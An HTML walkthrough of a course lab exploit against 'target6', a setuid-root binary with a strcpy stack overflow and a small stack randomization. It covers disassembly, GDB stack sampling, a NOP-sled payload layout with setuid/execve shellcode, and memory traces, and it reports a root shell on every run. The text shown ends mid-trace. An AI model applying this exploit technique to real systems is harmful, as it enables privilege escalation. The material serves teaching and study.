@@ -1,0 +1,877 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>target6 — Defeating MINIASLR with a NOP Sled</title>
+<style>
+  :root {
+    --ink:#17202b; --muted:#5b6879; --bg:#f3f6fa; --card:#fff; --line:#d9e1eb;
+    --red:#b42318; --red-bg:#fef3f2; --green:#13713d; --green-bg:#ecfdf3;
+    --blue:#1d5fa7; --blue-bg:#eff6ff; --amber:#8a5a00; --amber-bg:#fffaeb;
+    --purple:#6941c6; --purple-bg:#f4f0ff;
+    --code-bg:#101823; --code-ink:#dce7f4; --code-muted:#8b9db2;
+    --mono:"Cascadia Code",Consolas,"SFMono-Regular","Liberation Mono",monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    margin:0; color:var(--ink);
+    background:
+      radial-gradient(circle at 12% 0%, #e2ecff 0, transparent 32rem),
+      radial-gradient(circle at 92% 16%, #e7f8ef 0, transparent 28rem),
+      var(--bg);
+    font-family:"Segoe UI",system-ui,-apple-system,sans-serif; line-height:1.62;
+  }
+  a { color:var(--blue); }
+  code, pre { font-family:var(--mono); }
+  .wrap { width:min(1160px,calc(100% - 32px)); margin:0 auto; }
+
+  header.hero {
+    color:#f8fbff;
+    background:
+      radial-gradient(circle at 82% 12%, rgba(80,151,255,.28) 0, transparent 25rem),
+      radial-gradient(circle at 14% 84%, rgba(72,211,146,.14) 0, transparent 20rem),
+      linear-gradient(135deg,#101823 0%,#182a3e 54%,#14332b 100%);
+    border-bottom:1px solid #0a1017; padding:62px 0 46px;
+  }
+  .eyebrow { color:#7de0a8; text-transform:uppercase; letter-spacing:.17em; font-size:.74rem; font-weight:800; margin-bottom:14px; }
+  h1 { max-width:980px; margin:0; font-size:clamp(2.1rem,5vw,4rem); line-height:1.04; letter-spacing:-.035em; }
+  .lede { max-width:880px; color:#bdcad9; font-size:1.08rem; margin:22px 0 26px; }
+  .badges { display:flex; flex-wrap:wrap; gap:9px; }
+  .badge { display:inline-flex; gap:7px; align-items:center; padding:7px 11px; border:1px solid rgba(255,255,255,.16); border-radius:999px; background:rgba(255,255,255,.06); color:#e8eff8; font-size:.75rem; font-weight:700; letter-spacing:.03em; }
+  .badge .dot { width:7px; height:7px; border-radius:50%; background:#7de0a8; }
+  .badge.blue .dot { background:#84bdff; }
+  .badge.amber .dot { background:#ffc266; }
+
+  main { padding:38px 0 80px; }
+  section { margin:52px 0; scroll-margin-top:18px; }
+  h2 { font-size:clamp(1.5rem,3vw,2.1rem); line-height:1.16; letter-spacing:-.025em; margin:0 0 8px; }
+  h2 .num { display:inline-grid; place-items:center; vertical-align:4px; width:34px; height:34px; margin-right:8px; border-radius:10px; background:#18283b; color:#fff; font-size:.94rem; letter-spacing:0; }
+  h3 { font-size:1.12rem; margin:26px 0 8px; }
+  p { margin:10px 0; }
+  .section-intro { color:var(--muted); max-width:920px; margin-bottom:20px; }
+
+  .toc { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:18px 22px; margin-bottom:38px; box-shadow:0 8px 24px rgba(22,34,51,.05); }
+  .toc strong { display:block; font-size:.76rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
+  .toc ol { margin:0; padding-left:20px; columns:2; column-gap:36px; }
+  .toc li { margin:5px 0; break-inside:avoid; }
+
+  .card { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:22px; box-shadow:0 8px 24px rgba(22,34,51,.045); }
+  .grid { display:grid; gap:16px; }
+  .grid.two { grid-template-columns:repeat(2,minmax(0,1fr)); }
+  .grid.three { grid-template-columns:repeat(3,minmax(0,1fr)); }
+  .stat { padding:18px 20px; }
+  .stat .label { color:var(--muted); font-size:.71rem; text-transform:uppercase; letter-spacing:.11em; font-weight:800; }
+  .stat .value { font-family:var(--mono); font-size:1.1rem; font-weight:800; margin-top:6px; word-break:break-word; }
+  .stat .hint { color:var(--muted); font-size:.84rem; margin-top:3px; }
+
+  .callout { border-radius:14px; padding:16px 18px; margin:18px 0; border:1px solid; }
+  .callout strong:first-child { display:block; margin-bottom:3px; }
+  .callout.danger { background:var(--red-bg); border-color:#f5c7c2; color:#68130d; }
+  .callout.success { background:var(--green-bg); border-color:#b7ebc9; color:#0b5130; }
+  .callout.info { background:var(--blue-bg); border-color:#c7ddf8; color:#123f72; }
+  .callout.warn { background:var(--amber-bg); border-color:#f2d28a; color:#664000; }
+  .callout.purple { background:var(--purple-bg); border-color:#d9ccff; color:#3f2a83; }
+
+  .file-label { display:inline-block; margin:18px 0 -8px; padding:5px 10px; border-radius:8px 8px 0 0; background:#1b2a3d; color:#bdd0e5; font-family:var(--mono); font-size:.72rem; border:1px solid #2b3d53; border-bottom:0; }
+  .file-label + pre { margin-top:0; border-top-left-radius:0; }
+  pre { margin:16px 0; padding:18px 20px; border-radius:14px; background:var(--code-bg); color:var(--code-ink); font-size:.81rem; line-height:1.55; overflow-x:auto; border:1px solid #263649; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
+  pre .c { color:var(--code-muted); }
+  pre .g { color:#7be0a3; }
+  pre .r { color:#ff8d84; }
+  pre .y { color:#ffd166; }
+  pre .b { color:#8ec5ff; }
+  pre .p { color:#c7a7ff; }
+
+  .table-wrap { overflow-x:auto; margin:16px 0; border:1px solid var(--line); border-radius:14px; background:#fff; }
+  table { width:100%; border-collapse:collapse; font-size:.86rem; }
+  th,td { text-align:left; padding:10px 13px; border-bottom:1px solid #e9eef5; vertical-align:top; }
+  th { background:#f7f9fc; color:#455367; font-size:.71rem; text-transform:uppercase; letter-spacing:.08em; }
+  tr:last-child td { border-bottom:0; }
+  td.mono, th.mono { font-family:var(--mono); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:.72rem; font-weight:800; white-space:nowrap; background:#e8edf5; color:#344257; }
+  .pill.red { background:var(--red-bg); color:var(--red); }
+  .pill.green { background:var(--green-bg); color:var(--green); }
+  .pill.blue { background:var(--blue-bg); color:var(--blue); }
+  .pill.amber { background:var(--amber-bg); color:var(--amber); }
+
+  .slider-card { border:1px solid #bfcde0; border-radius:18px; background:linear-gradient(180deg,#fff,#fbfdff); box-shadow:0 16px 44px rgba(23,42,68,.10); padding:20px 22px; margin:20px 0; }
+  .slider-head { display:flex; justify-content:space-between; gap:16px; flex-wrap:wrap; align-items:baseline; }
+  .slider-head label { font-weight:800; }
+  .slider-head .val { font-family:var(--mono); font-weight:800; color:var(--purple); }
+  input[type=range] { width:100%; accent-color:#6941c6; margin:14px 0 8px; }
+  .math { display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:10px; margin:12px 0 16px; }
+  .math .box { border:1px solid #e1e7ef; background:#fbfcfe; border-radius:10px; padding:10px 12px; }
+  .math .k { color:#66758a; font-size:.68rem; font-weight:800; letter-spacing:.09em; text-transform:uppercase; }
+  .math .v { font-family:var(--mono); font-weight:800; color:#183049; margin-top:3px; word-break:break-all; }
+  .payload-map { position:relative; height:72px; border-radius:12px; overflow:hidden; border:1px solid #d8e0ea; background:#eef1f5; font-size:.66rem; }
+  .seg { position:absolute; top:0; bottom:0; display:flex; align-items:center; justify-content:center; font-weight:800; color:#203247; overflow:hidden; white-space:nowrap; }
+  .seg.nop { left:0; width:86.538%; background:#dcecff; color:#124f9c; }
+  .seg.shell { left:86.538%; width:5.096%; background:#c9f7d8; color:#0c6b37; }
+  .seg.fill { left:91.634%; width:7.981%; background:#eef1f5; color:#7b8898; }
+  .seg.ret { left:99.615%; width:0.385%; background:#ffd9d6; color:#8b1a12; }
+  .marker { position:absolute; top:-6px; bottom:-6px; width:3px; background:#b42318; box-shadow:0 0 0 2px rgba(255,255,255,.8); transition:left .08s linear; }
+  .marker::before { content:"entry"; position:absolute; top:-21px; left:-17px; color:#b42318; font-family:var(--mono); font-size:.66rem; font-weight:800; }
+  .legend { display:flex; flex-wrap:wrap; gap:12px; margin-top:14px; color:#5d6b7d; font-size:.78rem; }
+  .legend span::before { content:""; display:inline-block; width:10px; height:10px; border-radius:3px; margin-right:5px; vertical-align:-1px; background:var(--sw); }
+
+  ul,ol { padding-left:24px; }
+  li { margin:5px 0; }
+  .small { font-size:.83rem; color:var(--muted); }
+  footer { border-top:1px solid var(--line); padding:26px 0 0; color:var(--muted); font-size:.84rem; }
+
+  @media (max-width:900px) {
+    .grid.two,.grid.three { grid-template-columns:1fr; }
+    .toc ol { columns:1; }
+    .math { grid-template-columns:1fr; }
+  }
+</style>
+<link rel="stylesheet" href="../stack-anim.css">
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="eyebrow">target6 · mini-ASLR · GDB walkthrough</div>
+    <h1>Defeating a 0–255 byte stack randomization with a NOP sled</h1>
+    <p class="lede">
+      This is the path from <code>target6.c</code> to <code>sol6.py</code>:
+      find the stack buffer offset, measure how MINIASLR moves the stack with GDB,
+      choose a fixed return address inside a large NOP sled, and reuse the lab's own
+      shellcode from <code>shellcode.py</code>.
+    </p>
+    <div class="badges">
+      <span class="badge"><span class="dot"></span>Stack is executable (RWE)</span>
+      <span class="badge blue"><span class="dot"></span>Observed buf range: 0xfff6b540–0xfff6b630</span>
+      <span class="badge amber"><span class="dot"></span>200 / 200 root shells</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+<section id="stack-animation" style="margin-top:24px">
+  <div class="stack-anim" data-target="t6"></div>
+</section>
+
+
+  <nav class="toc">
+    <strong>Walkthrough</strong>
+    <ol>
+      <li><a href="#summary">Result and short version</a></li>
+      <li><a href="#target">target6: the bug and protections</a></li>
+      <li><a href="#miniaslr">What MINIASLR actually does</a></li>
+      <li><a href="#disasm">Find the buffer and saved EIP</a></li>
+      <li><a href="#gdb-samples">Measure the random stack with GDB</a></li>
+      <li><a href="#strategy">The NOP-sled strategy</a></li>
+      <li><a href="#trace">GDB trace of the working payload</a></li>
+      <li><a href="#shellcode">Using shellcode.py in sol6.py</a></li>
+      <li><a href="#test">Final test: 200 / 200 root</a></li>
+      <li><a href="#reproduce">Reproduce the investigation</a></li>
+    </ol>
+  </nav>
+
+  <!-- ============================================================ -->
+  <section id="summary">
+    <h2><span class="num">0</span>Result and short version</h2>
+    <p class="section-intro">
+      The target has a 1024-byte stack buffer and executes the stack. MINIASLR only moves
+      the stack by a small random amount, so the overflow is still reliable: put a large
+      NOP sled in front of the shellcode and return to a fixed address in the middle of it.
+    </p>
+
+    <div class="grid three">
+      <div class="card stat">
+        <div class="label">buf start</div>
+        <div class="value">EBP - 0x408</div>
+        <div class="hint">from <code>lea edx,[ebp-0x408]</code></div>
+      </div>
+      <div class="card stat">
+        <div class="label">saved EIP offset</div>
+        <div class="value">1036</div>
+        <div class="hint">1024 buffer + 8 bytes + saved EBP</div>
+      </div>
+      <div class="card stat">
+        <div class="label">chosen return address</div>
+        <div class="value">0xfff6b7c8</div>
+        <div class="hint">lands 408–663 bytes into the payload</div>
+      </div>
+      <div class="card stat">
+        <div class="label">NOP sled</div>
+        <div class="value">900 bytes</div>
+        <div class="hint">covers every possible 0–255 shift</div>
+      </div>
+      <div class="card stat">
+        <div class="label">shellcode</div>
+        <div class="value">shellcode.py</div>
+        <div class="hint">provided <code>setuid(0)</code> + <code>execve("/bin/sh")</code></div>
+      </div>
+      <div class="card stat">
+        <div class="label">test result</div>
+        <div class="value">200 / 200</div>
+        <div class="hint">every run produced <code>uid=0(root)</code></div>
+      </div>
+    </div>
+
+    <div class="callout success">
+      <strong>Exploit in one sentence</strong>
+      Overwrite the saved return address at payload offset 1036 with
+      <code>0xfff6b7c8</code>; whatever the random stack shift is, that address points
+      inside the 900-byte NOP sled, which slides into the shellcode at offset 900.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target">
+    <h2><span class="num">1</span>target6: the bug and protections</h2>
+    <p class="section-intro">
+      The vulnerable function copies the command-line argument into a 1024-byte stack
+      buffer with <code>strcpy()</code>. The binary is also built with an executable stack,
+      which is why injected shellcode can run at all.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target6.c</h3>
+        <pre style="margin-bottom:0">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+<span class="c">// Compiled with -DMINIASLR.</span>
+
+void vulnerable(char *arg)
+{
+    char buf[1024];
+    strcpy(buf, arg);      <span class="c">// no bounds check</span>
+}
+
+int _main(int argc, char *argv[])
+{
+    if (argc != 2) {
+        fprintf(stderr, "Error: Need a command-line argument\n");
+        exit(1);
+    }
+
+    vulnerable(argv[1]);   <span class="c">// attacker-controlled argument</span>
+
+    return 0;
+}</pre>
+      </div>
+
+      <div class="card">
+        <h3 style="margin-top:0">Protection facts from the VM</h3>
+        <pre style="margin-bottom:0">Class:      ELF32
+Type:       <span class="y">EXEC</span> (non-PIE)
+GNU_STACK:  <span class="g">RWE</span>          <span class="c">; stack is executable</span>
+ASLR:       /proc/sys/kernel/randomize_va_space = 0
+MINIASLR:   <span class="r">random 0..255 byte stack shift</span>
+Canary:     none in vulnerable()
+Setuid:     target6 is mode 6777, owner root</pre>
+        <p class="small" style="margin-bottom:0">
+          The helper's separate canary protects its own <code>main()</code> frame.
+          Our overflow is in <code>vulnerable()</code>, and the shellcode replaces the
+          process before returning to the helper, so that check is never reached.
+        </p>
+      </div>
+    </div>
+
+    <div class="file-label">GDB / readelf evidence — gdb_target6_info.txt</div>
+    <pre>GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 <span class="g">RWE</span> 0x10
+0804a051 T vulnerable
+<span class="c"># patched STACK_GOAL constant at file offset 7465:</span>
+STACK_GOAL = <span class="y">0xfffeba8d</span>
+after -0x80000 = <span class="y">0xfff6ba8d</span></pre>
+
+    <p class="small">
+      Full file: <a href="gdb_target6_info.txt">gdb_target6_info.txt</a> ·
+      memory map: <a href="gdb_target6_maps.txt">gdb_target6_maps.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="miniaslr">
+    <h2><span class="num">2</span>What MINIASLR actually does</h2>
+    <p class="section-intro">
+      The interesting part is not full ASLR. It is a small random subtraction from an
+      otherwise normalized stack position. The helper deliberately moves the stack to a
+      predictable place, then subtracts <code>r &amp; 0xFF</code>.
+    </p>
+
+    <div class="file-label">helper.c — relevant part</div>
+    <pre><span class="c">// Normalize the stack to a fixed goal ...</span>
+#ifdef MINIASLR
+    unsigned int r;
+    getentropy(&amp;r, sizeof(unsigned int));
+    <span class="r">stack_goal -= r &amp; 0xFF;</span>   <span class="c">// random shift: 0..255 bytes</span>
+#endif
+
+    char *esp = alloca(0);
+    ...
+    alloca(esp - stack_goal);       <span class="c">// move ESP to stack_goal</span>
+
+<span class="c">// Copy argv to the normalized stack, clear envp, ...</span>
+
+    <span class="c">// Move the stack again so argument length does not change _main's frame.</span>
+    stack_goal -= (MAX_PAD &gt;&gt; 1);  <span class="c">// subtract 0x80000</span>
+    esp = alloca(0);
+    ...
+    alloca(esp - stack_goal);</pre>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">Why the stack still moves</h3>
+        <p>
+          The helper removes the usual environment/argument variation. The only remaining
+          variation is the random <code>r</code>. So the vulnerable buffer address is:
+        </p>
+        <pre style="margin-bottom:0">BUF = constant - r
+r = 0..255</pre>
+        <p class="small" style="margin-bottom:0">
+          GDB confirms this: the buffer only moves through a small range and never leaves
+          the same stack region.
+        </p>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">The actual patched constant</h3>
+        <p>
+          The pre-built target6 binary contains the student-specific
+          <code>STACK_GOAL</code> at file offset 7465:
+        </p>
+        <pre style="margin-bottom:0">bytes: 8d ba fe ff
+little-endian: 0xfffeba8d
+after -0x80000: 0xfff6ba8d</pre>
+        <p class="small" style="margin-bottom:0">
+          That is why the stack addresses in this walkthrough start with
+          <code>0xfff6b...</code>.
+        </p>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>Key consequence</strong>
+      We do not need to know the exact random value. We only need a return address that
+      remains inside our NOP sled for every possible shift from 0 to 255.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="disasm">
+    <h2><span class="num">3</span>Find the buffer and saved EIP</h2>
+    <p class="section-intro">
+      The disassembly of <code>vulnerable()</code> gives the exact stack offsets.
+      The instruction that matters is <code>lea edx,[ebp-0x408]</code>.
+    </p>
+
+    <div class="file-label">objdump -d -Mintel --disassemble=vulnerable target6</div>
+    <pre>0804a051 &lt;vulnerable&gt;:
+ 804a051: 55                    push   ebp
+ 804a052: 89 e5                 mov    ebp,esp
+ 804a054: 53                    push   ebx
+ 804a055: 81 ec 04 04 00 00     sub    esp,0x404
+ 804a05b: e8 7e 00 00 00        call   __x86.get_pc_thunk.ax
+ 804a060: 05 a0 df 09 00        add    eax,0x9dfa0
+ 804a065: 83 ec 08              sub    esp,0x8
+ 804a068: ff 75 08              push   DWORD PTR [ebp+0x8]   <span class="c">; arg</span>
+<span class="h" style="background:rgba(255,196,0,.13)"> 804a06b: 8d 95 f8 fb ff ff     lea    edx,[ebp-0x408]         <span class="c">; &amp;buf</span></span>
+ 804a071: 52                    push   edx                     <span class="c">; destination</span>
+ 804a072: 89 c3                 mov    ebx,eax
+ 804a074: e8 a7 ef ff ff        call   strcpy
+ 804a079: 83 c4 10              add    esp,0x10
+ 804a07c: 90                    nop
+ 804a07d: 8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
+ 804a080: c9                    leave
+ 804a081: c3                    ret</pre>
+
+    <div class="grid three">
+      <div class="card stat">
+        <div class="label">buf</div>
+        <div class="value">EBP - 0x408</div>
+        <div class="hint">0x408 = 1032 bytes</div>
+      </div>
+      <div class="card stat">
+        <div class="label">saved EBP</div>
+        <div class="value">EBP + 0</div>
+        <div class="hint">starts at payload offset 1032</div>
+      </div>
+      <div class="card stat">
+        <div class="label">saved EIP</div>
+        <div class="value">EBP + 4</div>
+        <div class="hint">starts at payload offset 1036</div>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Why offset 1036 is the target</strong>
+      <code>buf</code> starts at <code>EBP-0x408</code>. To reach <code>EBP+4</code>,
+      the payload needs <code>0x408 + 4 = 1036</code> bytes before the new return address.
+      The first 1024 bytes fill the declared array, the next 8 bytes cover compiler
+      padding, and then the saved EBP is overwritten before the saved EIP.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="gdb-samples">
+    <h2><span class="num">4</span>Measure the random stack with GDB</h2>
+    <p class="section-intro">
+      We break at <code>0x0804a06b</code>, immediately after the vulnerable function's
+      prologue and just before <code>strcpy</code>. At that moment we can print
+      <code>EBP</code> and compute the buffer address.
+    </p>
+
+    <div class="file-label">GDB command used for each sample</div>
+    <pre>break *0x0804a06b
+commands
+  silent
+  printf "EBP=%p ESP=%p BUF=%p\n", $ebp, $esp, $ebp-0x408
+  quit
+end
+run</pre>
+
+    <p>
+      Running this 100 times produced only 16 different buffer addresses. This is the
+      direct GDB output, summarized:
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Times seen</th><th>EBP</th><th>ESP</th><th>BUF = EBP-0x408</th><th>Difference from max</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="mono">3</td><td class="mono">0xfff6b948</td><td class="mono">0xfff6b534</td><td class="mono">0xfff6b540</td><td class="mono">-0xf0</td></tr>
+          <tr><td class="mono">4</td><td class="mono">0xfff6b958</td><td class="mono">0xfff6b544</td><td class="mono">0xfff6b550</td><td class="mono">-0xe0</td></tr>
+          <tr><td class="mono">9</td><td class="mono">0xfff6b968</td><td class="mono">0xfff6b554</td><td class="mono">0xfff6b560</td><td class="mono">-0xd0</td></tr>
+          <tr><td class="mono">7</td><td class="mono">0xfff6b978</td><td class="mono">0xfff6b564</td><td class="mono">0xfff6b570</td><td class="mono">-0xc0</td></tr>
+          <tr><td class="mono">9</td><td class="mono">0xfff6b988</td><td class="mono">0xfff6b574</td><td class="mono">0xfff6b580</td><td class="mono">-0xb0</td></tr>
+          <tr><td class="mono">10</td><td class="mono">0xfff6b998</td><td class="mono">0xfff6b584</td><td class="mono">0xfff6b590</td><td class="mono">-0xa0</td></tr>
+          <tr><td class="mono">7</td><td class="mono">0xfff6b9a8</td><td class="mono">0xfff6b594</td><td class="mono">0xfff6b5a0</td><td class="mono">-0x90</td></tr>
+          <tr><td class="mono">6</td><td class="mono">0xfff6b9b8</td><td class="mono">0xfff6b5a4</td><td class="mono">0xfff6b5b0</td><td class="mono">-0x80</td></tr>
+          <tr><td class="mono">6</td><td class="mono">0xfff6b9c8</td><td class="mono">0xfff6b5b4</td><td class="mono">0xfff6b5c0</td><td class="mono">-0x70</td></tr>
+          <tr><td class="mono">7</td><td class="mono">0xfff6b9d8</td><td class="mono">0xfff6b5c4</td><td class="mono">0xfff6b5d0</td><td class="mono">-0x60</td></tr>
+          <tr><td class="mono">4</td><td class="mono">0xfff6b9e8</td><td class="mono">0xfff6b5d4</td><td class="mono">0xfff6b5e0</td><td class="mono">-0x50</td></tr>
+          <tr><td class="mono">6</td><td class="mono">0xfff6b9f8</td><td class="mono">0xfff6b5e4</td><td class="mono">0xfff6b5f0</td><td class="mono">-0x40</td></tr>
+          <tr><td class="mono">7</td><td class="mono">0xfff6ba08</td><td class="mono">0xfff6b5f4</td><td class="mono">0xfff6b600</td><td class="mono">-0x30</td></tr>
+          <tr><td class="mono">4</td><td class="mono">0xfff6ba18</td><td class="mono">0xfff6b604</td><td class="mono">0xfff6b610</td><td class="mono">-0x20</td></tr>
+          <tr><td class="mono">7</td><td class="mono">0xfff6ba28</td><td class="mono">0xfff6b614</td><td class="mono">0xfff6b620</td><td class="mono">-0x10</td></tr>
+          <tr><td class="mono">4</td><td class="mono">0xfff6ba38</td><td class="mono">0xfff6b624</td><td class="mono">0xfff6b630</td><td class="mono">0</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout purple">
+      <strong>Addresses to look at, and why</strong>
+      <code>EBP</code> is the frame base. <code>BUF = EBP-0x408</code> is the start of the
+      attacker-controlled data. <code>EBP+4</code> is the saved return address.
+      The GDB samples show <code>BUF</code> ranges from <strong>0xfff6b540</strong> to
+      <strong>0xfff6b630</strong> — a span of 0xf0 bytes. We design for the full 0–255
+      range to be safe.
+    </div>
+
+    <p class="small">
+      Raw 100-run output: <a href="gdb_target6_bufsamples.txt">gdb_target6_bufsamples.txt</a> ·
+      summary: <a href="gdb_target6_bufsummary.txt">gdb_target6_bufsummary.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="strategy">
+    <h2><span class="num">5</span>The NOP-sled strategy</h2>
+    <p class="section-intro">
+      We cannot return to an exact buffer address because it changes. Instead, return to a
+      fixed address that lands somewhere in a long NOP sled. The CPU executes the NOPs
+      until it reaches the shellcode.
+    </p>
+
+    <div class="math">
+      <div class="box">
+        <div class="k">Fixed return address</div>
+        <div class="v">RET = 0xfff6b7c8</div>
+      </div>
+      <div class="box">
+        <div class="k">Worst-case buffer</div>
+        <div class="v">BUF = 0xfff6b630 - 255</div>
+      </div>
+      <div class="box">
+        <div class="k">Landing offset</div>
+        <div class="v">RET - BUF = 408 + r</div>
+      </div>
+    </div>
+
+    <div class="slider-card">
+      <div class="slider-head">
+        <label for="rval">Simulated MINIASLR offset <code>r</code>:</label>
+        <span class="val"><span id="rshow">0</span> bytes</span>
+      </div>
+      <input id="rval" type="range" min="0" max="255" value="0" step="1">
+      <div class="math">
+        <div class="box">
+          <div class="k">BUF = 0xfff6b630 - r</div>
+          <div class="v" id="bufshow">0xfff6b630</div>
+        </div>
+        <div class="box">
+          <div class="k">RET - BUF</div>
+          <div class="v" id="offshow">408</div>
+        </div>
+        <div class="box">
+          <div class="k">Lands in</div>
+          <div class="v" id="landshow">NOP sled</div>
+        </div>
+      </div>
+      <div class="payload-map" aria-label="Payload layout">
+        <div class="seg nop" title="NOP sled, offsets 0–899">NOP sled · offsets 0–899</div>
+        <div class="seg shell" title="shellcode, offsets 900–952">SC</div>
+        <div class="seg fill" title="filler, offsets 953–1035"></div>
+        <div class="seg ret" title="saved EIP overwrite, offsets 1036–1039"></div>
+        <div class="marker" id="marker" style="left:39.2%"></div>
+      </div>
+      <div class="legend">
+        <span style="--sw:#dcecff">NOP sled</span>
+        <span style="--sw:#c9f7d8">shellcode</span>
+        <span style="--sw:#eef1f5">filler</span>
+        <span style="--sw:#ffd9d6">saved EIP overwrite at 1036</span>
+      </div>
+      <p class="small" style="margin-bottom:0">
+        GDB observed the buffer at multiples of 16 between
+        <code>0xfff6b540</code> and <code>0xfff6b630</code>. The slider uses the full
+        0–255 range; even at the extreme, the landing point stays before offset 900.
+      </p>
+    </div>
+
+    <h3>Payload layout used by sol6.py</h3>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th class="mono">offset</th><th class="mono">bytes</th><th>purpose</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="mono">0 – 899</td><td class="mono">0x90 × 900</td><td>NOP sled; the fixed return address lands at 408–663</td></tr>
+          <tr><td class="mono">900 – 952</td><td class="mono">53 bytes</td><td><code>shellcode.py</code>: <code>setuid(0)</code> + <code>execve("/bin/sh")</code></td></tr>
+          <tr><td class="mono">953 – 1035</td><td class="mono">0x90 filler</td><td>fills up to the saved EBP/EIP slots</td></tr>
+          <tr><td class="mono">1036 – 1039</td><td class="mono">c8 b7 f6 ff</td><td><code>0xfff6b7c8</code> little-endian — new saved EIP</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Why the return address can be fixed</strong>
+      The shellcode is not at one fixed address, but the return address does not need to
+      point at the shellcode. It only needs to point anywhere inside the NOP sled.
+      A 900-byte sled is much larger than the 0–255 byte uncertainty.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="trace">
+    <h2><span class="num">6</span>GDB trace of the working payload</h2>
+    <p class="section-intro">
+      This is the actual GDB run with <code>sol6.py</code> as the argument. In this run the
+      random buffer address was <code>0xfff6b550</code>. The comments after each line
+      explain what to look at. The trace uses a copy of target6 because GDB drops setuid
+      privileges; the stack addresses are the same because the helper normalizes the stack.
+      The root test below uses the real setuid-root target.
+    </p>
+
+    <div class="file-label">GDB — before strcpy and after strcpy</div>
+    <pre><span class="b">[1] vulnerable() after prologue, BEFORE strcpy</span>
+<span class="g">EBP = 0xfff6b958</span>            <span class="c"># frame base for this random run</span>
+<span class="g">ESP = 0xfff6b544</span>            <span class="c"># top of the active stack</span>
+<span class="y">BUF = EBP-0x408 = 0xfff6b550</span>  <span class="c"># start of the overflow buffer</span>
+<span class="c">saved EBP slot = EBP = 0xfff6b958</span>
+<span class="c">saved EIP slot = EBP+4 = 0xfff6b95c</span>
+<span class="c">original saved EIP = 0x0804a0d1  # normal return after vulnerable()</span>
+buf, first 12 words (uninitialized):
+0xfff6b550: 0x00000000 0x00000000 0x00000000 0x00000000
+0xfff6b560: 0x00000000 0x00000000 0x00000000 0x00000000
+0xfff6b570: 0x00000000 0x00000000 0x00000000 0x00000000
+<span class="c"># Nothing has been copied yet; these words are zero/uninitialized stack.</span>
+
+<span class="b">[2] AFTER strcpy(): the overflow has happened</span>
+<span class="g">EBP = 0xfff6b958</span>
+<span class="y">BUF = EBP-0x408 = 0xfff6b550</span>
+<span class="c">saved EIP slot (EBP+4) = 0xfff6b95c</span>
+<span class="r">saved EIP value NOW = 0xfff6b7c8</span>  <span class="c"># overwritten with our fixed return address</span>
+
+first 32 bytes of buf (NOP sled = 0x90):
+0xfff6b550: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b558: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b560: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b568: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+<span class="c"># 0x90 is the x86 NOP instruction. The sled starts here.</span>
+
+memory around the end of the buffer, saved EBP, and saved EIP:
+0xfff6b948: 0x90909090 0x90909090 0x90909090 0x90909090
+<span class="r">0xfff6b958: 0x90909090 0xfff6b7c8</span>  <span class="c"># saved EBP, then saved EIP</span>
+0xfff6b968: 0xfffeb500 0x00000000 0x00000000 0x0804a08e
+
+bytes of the saved EIP slot:
+<span class="r">0xfff6b95c: 0xc8 0xb7 0xf6 0xff</span>  <span class="c"># little-endian 0xfff6b7c8</span></pre>
+
+    <div class="callout danger">
+      <strong>GDB pitfall encountered during this investigation</strong>
+      Setting a breakpoint at <code>0xfff6b7c8</code> itself overwrites the first sled byte
+      with a breakpoint instruction and can make the run crash. The final trace avoids
+      that by using <code>stepi</code> at <code>ret</code> instead of placing a breakpoint
+      on the stack address.
+    </div>
+
+    <div class="file-label">GDB — at ret and after stepping into the sled</div>
+    <pre><span class="b">[3] At vulnerable()'s ret instruction</span>
+<span class="g">ESP = 0xfff6b95c</span>              <span class="c"># ESP points exactly at the saved EIP slot</span>
+<span class="g">EIP = 0x804a081</span>              <span class="c"># the ret instruction</span>
+<span class="r">ret is about to pop the word at ESP: 0xfff6b7c8</span>
+0xfff6b95c: 0xfff6b7c8 0xfffeb500 0x00000000 0x00000000
+<span class="c"># After pop, EIP becomes 0xfff6b7c8. ESP moves to 0xfff6b960.</span>
+
+pointed-to bytes (should be 0x90 NOPs):
+0xfff6b7c8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b7d0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+
+Executing ret with stepi (no breakpoint is placed on the stack)...
+0xfff6b7c8 in ?? ()
+
+<span class="b">[4] After ret: execution is now inside the NOP sled</span>
